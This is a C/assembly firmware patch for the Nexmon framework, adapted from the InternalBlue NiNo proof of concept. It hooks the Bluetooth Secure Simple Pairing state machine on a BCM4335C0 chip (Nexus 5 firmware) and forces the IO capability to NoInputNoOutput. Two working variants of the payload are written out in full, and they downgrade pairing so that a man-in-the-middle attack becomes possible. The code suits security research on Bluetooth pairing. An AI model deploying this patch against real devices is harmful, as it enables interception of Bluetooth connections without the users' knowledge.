
/*
 * Assembly and structure taken from: 
 * https://github.com/seemoo-lab/internalblue/blob/master/examples/NiNo_PoC.py
 */

#pragma NEXMON targetregion "patch"
#include <firmware_version.h>
#include <patcher.h>

#define HOOK_IO_CAP_RESP		  0x303D4	  // we just change the complete simple pairing state machine
#define ASM_LOCATION_IO_CAP_RESP  0xd7800     // memory area for the patch to be placed
#define IO_CAP_NO_INPUT_NO_OUTPUT 0x03		  // 
#define NON_NAKED_NINO

#ifdef NON_NAKED_NINO

#define ASM_LOCATION_NAKED_PREFIX 0xd782a

__attribute__((at(ASM_LOCATION_IO_CAP_RESP, "", CHIP_VER_BCM4335C0_BT)))
__attribute__((optimize("O0")))
void nino_payload(void){
	// overwrite variables used by sp_sm_io_cap_req_reply__lmp_io_cap_req_res_30286
    // which actually executes:
    //   send_LMP_IO_Capability_req_301E4
    //   send_LMP_IO_Capability_res_30170
	// Assembly represented by the code below:
	//  push {r0-r1, lr}    //variables we need in our actual subroutine here      
	//  ldr  r1, =0x20387D  //io_caps__auth_req_20387D
    //  oob and auth_req are already set to 0x00...
    //  ldrb r0, =0x03      //io_cap 0x03: NoInputNoOutput
    //  strb r0, [r1] 
	//  pop  {r0-r1, lr} 
	char* io_caps_auth_req = (char*)0x20387D;  //io_caps__auth_req_20387D
	*io_caps_auth_req = IO_CAP_NO_INPUT_NO_OUTPUT;
	// Here we can simply return because naked_prefix has set up an environment 
	// to use branch-link-jumps
}

__attribute__((at(ASM_LOCATION_NAKED_PREFIX, "", CHIP_VER_BCM4335C0_BT)))
__attribute__((optimize("O0")))
__attribute__((naked))
void naked_prefix(void){
	__asm__( 
			// The original 8 Bytes at HOOK_IO_CAP_RESP need to be restored
			// so everything still works fine.
			// This could be called a manual prologue.
			"push {r4-r6, lr}\n\t"
			"mov r4, r0\n\t"
			// Now we can call our NiNo-Payload using a bl-instruction
			// since we have saved the original lr-register above
			"bl 0xd7800\n\t"
			// because we have jumped into this function using a b-instruction
			// instead of a bl-instruction we also need to jump back using 
			// a simple branch-jump (instead of return / branch-link)
			// This could be called a manual epilogue.
			"b 0x303D8\n\t"
		   );
}

__attribute__((at(HOOK_IO_CAP_RESP, "", CHIP_VER_BCM4335C0_BT, FW_VER_NEXUS5)))
BPatch(naked_prefix, naked_prefix)

#else
// This implementation holds only the bare-assembly NiNo-payload.
// No manual prologue / epilogue is created to provided easier handling
// for C functions.

__attribute__((at(ASM_LOCATION_IO_CAP_RESP, "", CHIP_VER_BCM4335C0_BT)))
__attribute__((optimize("O0")))
__attribute__((naked))
void nino_payload_naked(void){
	__asm__("push {r4-r6, lr}\n\t"
			"mov r4, r0\n\t"
			"push {r0-r1, lr}\n\t"
			"ldr r1, =0x20387D\n\t"
			"ldrb r0, =0x03\n\t"
			"strb r0, [r1]\n\t"
			"pop {r0-r1, lr}\n"
			"locret:\n\t"
			"b 0x303D8\n\t"
		   );
}


__attribute__((at(HOOK_IO_CAP_RESP, "", CHIP_VER_BCM4335C0_BT, FW_VER_NEXUS5)))
BPatch(nino_payload_naked, nino_payload_naked)

#endif













